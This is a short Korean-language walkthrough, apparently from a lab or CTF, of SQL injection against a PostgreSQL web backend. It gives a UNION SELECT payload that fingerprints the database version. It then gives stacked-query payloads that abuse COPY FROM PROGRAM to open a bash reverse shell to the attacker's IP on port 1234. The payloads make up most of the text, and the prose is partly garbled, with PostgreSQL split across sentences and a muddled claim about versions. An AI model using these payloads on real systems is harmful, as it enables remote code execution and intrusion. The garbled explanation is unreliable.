sql injection
#
```
' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --
```
이 SQL 문을 사용하면 이 웹 사이트의 백엔드 데이터베이스가 Postgre임을 알 수 있습니다.SQL 버전 11.5. "Google University"에서 어떤 종류의 reverse shell을 얻을 수 있는지 알아보겠습니다. 우리는 Postgre에서 발견된 exploit에 대해 알게 되었다.버전 11.5의 경우 SQL 버전 9.3이 아직 살아 있습니다. * 메타스플로이트를 사용

`![image](https://user-images.githubusercontent.com/61821641/150574663-24469d46-8cb2-4bc2-89ed-fdd4d3af03c9.png)

#
`이어서 reverse shell`

```
'; CREATE TABLE cmd_exec(cmd_output text); --
'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/<my ip>/1234 0>&1'''; -- 
```

![image](https://user-images.githubusercontent.com/61821641/150575592-27443005-8908-470b-83ec-0d977f32a386.png)